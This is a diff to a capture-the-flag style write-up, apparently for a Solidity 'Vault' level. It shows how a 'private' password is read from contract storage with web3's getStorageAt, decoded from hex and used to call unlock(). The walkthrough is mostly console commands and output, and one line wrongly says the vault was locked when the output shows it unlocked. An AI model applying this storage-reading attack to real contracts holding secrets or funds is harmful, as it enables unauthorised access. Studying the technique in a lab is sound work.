@@ -55,28 +55,35 @@ In the above code:
 
 More about  [Smart Contract's Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)
 
-## Accessing Private Variabes In Storage
+## Accessing Private Variabes In Contract's Storage
 
+In solidity, unlike the general idea that someone can't access any private variable from external calls, we can access private variables from contract's storage because of the **_contract's storage open to external calls_**. In this senario, some libraries help us like **_web3_** to attain storage of contracts in blockchain. More about [Accessing Contract's Storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)
 
+When you access storage of a contract with web3 library, you should use like this ```web.eth.getStorageAt(contract address,slot index)``` . More about [getStorageAt()](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat)
 
 # Subverting
+
+Check situation of locked variable.
 
 ```shell
 await contract.locked()
 true
 ```
+Access **password** from our target contract's storage and appoint to pass variable.
 
 ```shell
 var pass = await web3.eth.getStorageAt(contract.address,1,console.log)
 ```
-
+The pass variable is in hex type. Let's convert it to Utf8 which is readable format.
 ```shell
 await web3.utils.hexToUtf8(pass)
 'A very strong secret password :)'
 ```
+Call unlock function and enter pass as password.
 ```shell
 await contract.unlock(pass)
 ```
+Check situation of locked variable again. And, we locked the vault!
 ```shell
 await contract.locked()
 false
